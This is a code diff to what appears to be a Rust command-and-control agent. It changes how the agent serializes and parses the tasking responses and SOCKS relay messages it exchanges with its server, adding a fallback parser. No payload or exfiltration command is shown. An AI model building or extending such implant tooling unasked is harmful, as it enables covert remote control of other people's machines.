@@ -43,8 +43,15 @@ pub struct GetTaskingResponseFallback {
 pub struct PostTaskingResponse {
     pub action: String,
     pub responses: Vec<serde_json::Value>,
-    #[serde(skip_serializing_if = "Vec::is_empty")]
-    pub socks: Vec<SocksMsg>,
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub socks: Option<Vec<SocksMsg>>,
+}
+
+/// Fallback response structure for post_response if the main one fails
+#[derive(Debug, Deserialize, Serialize)]
+pub struct PostTaskingResponseFallback {
+    pub action: String,
+    pub responses: Vec<serde_json::Value>,
 }
 
 /// Used for holding any data passed to background tasks
@@ -173,7 +180,7 @@ impl Agent {
         let body = PostTaskingResponse {
             action: "post_response".to_string(),
             responses: completed.to_owned(),
-            socks: socks_to_send,
+            socks: if socks_to_send.is_empty() { None } else { Some(socks_to_send) },
         };
 
         let req_payload = serde_json::to_string(&body)?;
@@ -182,12 +189,25 @@ impl Agent {
         // Debug: Print the received JSON to understand the structure
         eprintln!("DEBUG: Received JSON response from send_tasking: {}", json_response);
         
-        let response: PostTaskingResponse = serde_json::from_str(&json_response)
-            .map_err(|e| {
-                eprintln!("DEBUG: Failed to deserialize PostTaskingResponse: {}", e);
-                eprintln!("DEBUG: JSON was: {}", json_response);
-                e
-            })?;
+        let response = match serde_json::from_str::<PostTaskingResponse>(&json_response) {
+            Ok(resp) => resp,
+            Err(e) => {
+                eprintln!("DEBUG: Failed to deserialize PostTaskingResponse, trying fallback: {}", e);
+                // Try fallback structure without socks field
+                match serde_json::from_str::<PostTaskingResponseFallback>(&json_response) {
+                    Ok(fallback) => PostTaskingResponse {
+                        action: fallback.action,
+                        responses: fallback.responses,
+                        socks: None,
+                    },
+                    Err(fallback_err) => {
+                        eprintln!("DEBUG: Fallback also failed: {}", fallback_err);
+                        eprintln!("DEBUG: JSON was: {}", json_response);
+                        return Err(Box::new(fallback_err));
+                    }
+                }
+            }
+        };
 
         // Handle continued tasks
         let mut pending_tasks: Vec<AgentTask> = Vec::new();
